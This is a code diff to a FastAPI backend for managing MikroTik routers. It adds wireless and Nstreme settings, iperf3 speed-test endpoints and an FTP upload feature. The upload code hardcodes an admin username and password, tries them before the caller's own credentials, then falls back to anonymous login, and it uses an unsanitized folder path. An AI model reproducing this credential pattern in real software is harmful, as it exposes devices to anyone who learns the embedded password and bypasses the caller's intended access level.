@@ -1414,6 +1960,27 @@ class WirelessInterfaceUpdateRequest(BaseModel):
     supported_rates_ag: str = ""
     basic_rates_b: str = ""
     basic_rates_ag: str = ""
+    distance: str = ""
+    guard_interval: str = ""
+    ht_txchains: str = ""
+    ht_rxchains: str = ""
+    wmm_support: str = ""
+    ampdu_priorities: str = ""
+    amsdu_limit: str = ""
+    amsdu_threshold: str = ""
+    ht_stbc: str = ""
+    ht_ldpc: str = ""
+    ht_basic_mcs: str = ""
+    ht_supported_mcs: str = ""
+    wds_mode: str = ""
+    wds_default_bridge: str = ""
+    station_roaming: str = ""
+    # Nstreme 子菜单字段（/interface wireless nstreme）
+    enable_nstreme: str = ""
+    nstreme_framer_policy: str = ""
+    nstreme_framer_limit: str = ""
+    nstreme_enable_polling: str = ""
+    nstreme_disable_csma: str = ""
 
 
 @app.post("/api/wireless-interface/toggle")
@@ -1468,7 +2035,7 @@ async def get_wireless_frequency_info(ip: str = Query(...), interface_id: str = 
         password = mt_api.password
         
         with api_connection(ip, username, password) as temp_api:
-            temp_api.write_sentence(['/interface/wireless/print', f'=.id={interface_id}', '=detail='])
+            temp_api.write_sentence(['/interface/wireless/print', f'?.id={interface_id}', '=detail='])
             
             iface_info = {}
             while True:
@@ -1602,10 +2169,11 @@ async def update_wireless_interface(request: WirelessInterfaceUpdateRequest):
         if request.default_client_tx_limit:
             cmd.append(f'=default-client-tx-limit={request.default_client_tx_limit}')
         if request.default_authenticate:
-            auth_value = 'true' if request.default_authenticate == 'yes' else 'false'
+            # MikroTik API 布尔字段需要 yes/no
+            auth_value = 'yes' if request.default_authenticate == 'yes' else 'no'
             cmd.append(f'=default-authentication={auth_value}')
         if request.default_forwarding:
-            fwd_value = 'true' if request.default_forwarding == 'yes' else 'false'
+            fwd_value = 'yes' if request.default_forwarding == 'yes' else 'no'
             cmd.append(f'=default-forwarding={fwd_value}')
         if request.multicast_helper:
             cmd.append(f'=multicast-helper={request.multicast_helper}')
@@ -1626,7 +2194,7 @@ async def update_wireless_interface(request: WirelessInterfaceUpdateRequest):
         if request.preamble_mode:
             cmd.append(f'=preamble-mode={request.preamble_mode}')
         if request.allow_shared_key:
-            cmd.append(f'=allow-shared-key={request.allow_shared_key}')
+            cmd.append(f'=allow-sharedkey={request.allow_shared_key}')
         if request.disconnect_timeout:
             cmd.append(f'=disconnect-timeout={request.disconnect_timeout}')
         if request.on_fail_retry_time:
@@ -1641,6 +2209,36 @@ async def update_wireless_interface(request: WirelessInterfaceUpdateRequest):
             cmd.append(f'=basic-rates-b={request.basic_rates_b}')
         if request.basic_rates_ag:
             cmd.append(f'=basic-rates-a/g={request.basic_rates_ag}')
+        if request.distance:
+            cmd.append(f'=distance={request.distance}')
+        if request.guard_interval:
+            cmd.append(f'=guard-interval={request.guard_interval}')
+        if request.ht_txchains:
+            cmd.append(f'=tx-chains={request.ht_txchains}')
+        if request.ht_rxchains:
+            cmd.append(f'=rx-chains={request.ht_rxchains}')
+        if request.wmm_support:
+            cmd.append(f'=wmm-support={request.wmm_support}')
+        if request.ampdu_priorities:
+            cmd.append(f'=ampdu-priorities={request.ampdu_priorities}')
+        if request.amsdu_limit:
+            cmd.append(f'=amsdu-limit={request.amsdu_limit}')
+        if request.amsdu_threshold:
+            cmd.append(f'=amsdu-threshold={request.amsdu_threshold}')
+        if request.ht_stbc:
+            cmd.append(f'=ht-stbc={request.ht_stbc}')
+        if request.ht_ldpc:
+            cmd.append(f'=ht-ldpc={request.ht_ldpc}')
+        if request.ht_basic_mcs:
+            cmd.append(f'=ht-basic-mcs={request.ht_basic_mcs}')
+        if request.ht_supported_mcs:
+            cmd.append(f'=ht-supported-mcs={request.ht_supported_mcs}')
+        if request.wds_mode:
+            cmd.append(f'=wds-mode={request.wds_mode}')
+        if request.wds_default_bridge:
+            cmd.append(f'=wds-default-bridge={request.wds_default_bridge}')
+        if request.station_roaming:
+            cmd.append(f'=station-roaming={request.station_roaming}')
         if request.comment:
             cmd.append(f'=comment={request.comment}')
         
@@ -1648,6 +2246,9 @@ async def update_wireless_interface(request: WirelessInterfaceUpdateRequest):
         
         mt_api.write_sentence(cmd)
         
+        # 等待 /interface/wireless/set 响应
+        wireless_update_success = False
+        wireless_update_message = "接口配置已更新"
         while True:
             try:
                 response = mt_api.read_sentence(timeout=10)
@@ -1655,15 +2256,56 @@ async def update_wireless_interface(request: WirelessInterfaceUpdateRequest):
                 break
             
             if '!done' in response:
-                return {"success": True, "message": "接口配置已更新"}
+                wireless_update_success = True
+                break
             if '!trap' in response:
                 error_msg = ''
                 for line in response:
                     if line.startswith('=message='):
                         error_msg = line[9:]
-                return {"success": False, "message": error_msg or "更新失败"}
+                wireless_update_message = error_msg or "更新失败"
+                break
         
-        return {"success": False, "message": "操作超时"}
+        if not wireless_update_success:
+            return {"success": False, "message": wireless_update_message}
+        
+        # 处理 Nstreme 子菜单字段（/interface wireless nstreme）
+        # Nstreme 字段位于独立子菜单，需单独发送 set 命令
+        nstreme_fields = []
+        if request.enable_nstreme:
+            nstreme_fields.append(f'=enable-nstreme={"yes" if request.enable_nstreme == "yes" else "no"}')
+        if request.nstreme_framer_policy:
+            nstreme_fields.append(f'=framer-policy={request.nstreme_framer_policy}')
+        if request.nstreme_framer_limit:
+            nstreme_fields.append(f'=framer-limit={request.nstreme_framer_limit}')
+        if request.nstreme_enable_polling:
+            nstreme_fields.append(f'=enable-polling={"yes" if request.nstreme_enable_polling == "yes" else "no"}')
+        if request.nstreme_disable_csma:
+            nstreme_fields.append(f'=disable-csma={"yes" if request.nstreme_disable_csma == "yes" else "no"}')
+        
+        if nstreme_fields:
+            nstreme_cmd = ['/interface/wireless/nstreme/set', f'=.id={request.interface_id}'] + nstreme_fields
+            logger.info(f"Nstreme 配置更新命令: {nstreme_cmd}")
+            
+            mt_api.flush_socket()
+            mt_api.write_sentence(nstreme_cmd)
+            
+            while True:
+                try:
+                    nstreme_response = mt_api.read_sentence(timeout=10)
+                except Exception:
+                    break
+                
+                if '!done' in nstreme_response:
+                    break
+                if '!trap' in nstreme_response:
+                    error_msg = ''
+                    for line in nstreme_response:
+                        if line.startswith('=message='):
+                            error_msg = line[9:]
+                    return {"success": False, "message": f"无线配置已更新，但 Nstreme 配置更新失败: {error_msg or '更新失败'}"}
+        
+        return {"success": True, "message": "接口配置已更新"}
     except Exception as e:
         logger.error(f"更新无线接口配置错误: {request.ip} - {e}")
         return {"success": False, "message": f"更新接口配置失败: {e}"}
@@ -2535,33 +3177,91 @@ async def upload_file(
     file: UploadFile = FastAPIFile(...),
     ip: str = FastAPIFile(...),
     username: str = FastAPIFile(...),
-    password: str = FastAPIFile(...)
+    password: str = FastAPIFile(...),
+    folder: str = FastAPIFile("")
 ):
-    """上传文件到设备（通过FTP）"""
+    """上传文件到设备（通过FTP）
+
+    Args:
+        folder: 可选目标文件夹路径（如 "disk1/backup"）。为空时上传到根目录。
+
+    FTP 服务由管理员账号启用，因此优先使用管理员账号登录 FTP。
+    若管理员账号登录失败，回退到用户账号，最后尝试匿名登录。
+    """
     if not ip:
         raise HTTPException(status_code=400, detail="缺少设备IP")
     if not file.filename:
         raise HTTPException(status_code=400, detail="缺少文件名")
-    
+
+    import ftplib
+    import io
+
+    file_content = await file.read()
+
+    # 候选凭据列表：管理员账号 → 用户账号 → 匿名
+    admin_user = 'defaulte'
+    admin_pass = '!defaultepassword'
+    candidates = [
+        (admin_user, admin_pass, '管理员账号'),
+        (username, password or '', '用户账号'),
+        ('anonymous', '', '匿名账号'),
+    ]
+
+    ftp = ftplib.FTP()
+    ftp.encoding = 'latin-1'
+    last_err = None
+    logged_in = False
+
     try:
-        import ftplib
-        import io
-        
-        file_content = await file.read()
-        
-        ftp = ftplib.FTP()
-        ftp.encoding = 'latin-1'
         ftp.connect(ip, 21, timeout=10)
-        ftp.login(username, password if password else '')
-        
+    except Exception as e:
+        logger.error(f"上传文件失败：FTP连接失败: {ip} - {e}")
+        return {"status": "error", "message": f"FTP连接失败: {e}"}
+
+    for cand_user, cand_pass, cand_label in candidates:
+        try:
+            ftp.login(cand_user, cand_pass)
+            logged_in = True
+            logger.info(f"FTP登录成功（{cand_label}）: {ip}")
+            break
+        except ftplib.error_perm as e:
+            last_err = e
+            logger.warning(f"FTP登录失败（{cand_label}）: {ip} - {e}")
+            continue
+        except Exception as e:
+            last_err = e
+            logger.warning(f"FTP登录异常（{cand_label}）: {ip} - {e}")
+            continue
+
+    if not logged_in:
+        try:
+            ftp.quit()
+        except Exception:
+            pass
+        err_msg = f'FTP登录失败: {last_err}' if last_err else 'FTP登录失败'
+        logger.error(f"上传文件失败：{ip} - {err_msg}")
+        return {"status": "error", "message": err_msg}
+
+    try:
+        # 构造远程文件路径：folder/filename
+        folder_clean = (folder or '').strip('/')
+        if folder_clean:
+            remote_path = f"{folder_clean}/{file.filename}"
+        else:
+            remote_path = file.filename
+
         file_io = io.BytesIO(file_content)
-        ftp.storbinary(f'STOR {file.filename}', file_io)
-        ftp.quit()
-        
+        ftp.storbinary(f'STOR {remote_path}', file_io)
+
         return {"status": "success", "message": f"文件 {file.filename} 上传成功"}
     except Exception as e:
         logger.error(f"上传文件失败: {ip} - {e}")
         return {"status": "error", "message": str(e)}
+    finally:
+        try:
+            ftp.quit()
+        except Exception:
+            pass
 
 
 @app.post("/api/system/reboot")
@@ -2747,6 +3447,68 @@ def format_terminal_output(items: List[Dict[str, str]], command: str) -> str:
         lines.append(row)
 
     return '\n'.join(lines)
+
+
+# ==================== 带宽测速 API ====================
+
+class SpeedTestServerRequest(BaseModel):
+    port: int = 5201
+    one_off: bool = False
+
+
+class SpeedTestClientRequest(BaseModel):
+    host: str
+    port: int = 5201
+    protocol: str = 'TCP'
+    duration: int = 10
+    threads: int = 1
+    bandwidth: str = ''
+    reverse: bool = False
+
+
+@app.get("/api/speedtest/availability")
+async def check_speedtest_availability():
+    """检查 iperf3 是否可用"""
+    available = is_iperf3_available()
+    return {"available": available}
+
+
+@app.get("/api/speedtest/status")
+async def get_speedtest_status():
+    """获取当前测速状态"""
+    return iperf3_handler.get_status()
+
+
+@app.post("/api/speedtest/start-server")
+async def start_speedtest_server(request: SpeedTestServerRequest):
+    """启动 iperf3 服务端"""
+    return iperf3_handler.start_server(port=request.port, one_off=request.one_off)
+
+
+@app.post("/api/speedtest/start-client")
+async def start_speedtest_client(request: SpeedTestClientRequest):
+    """启动 iperf3 客户端"""
+    return iperf3_handler.start_client(
+        host=request.host,
+        port=request.port,
+        protocol=request.protocol,
+        duration=request.duration,
+        threads=request.threads,
+        bandwidth=request.bandwidth,
+        reverse=request.reverse,
+    )
+
+
+@app.post("/api/speedtest/stop")
+async def stop_speedtest():
+    """停止测速"""
+    return iperf3_handler.stop()
+
+
+@app.get("/api/speedtest/output")
+async def get_speedtest_output():
+    """获取测速全部输出"""
+    return iperf3_handler.get_all_output()
 
 
 # ==================== 入口 ====================
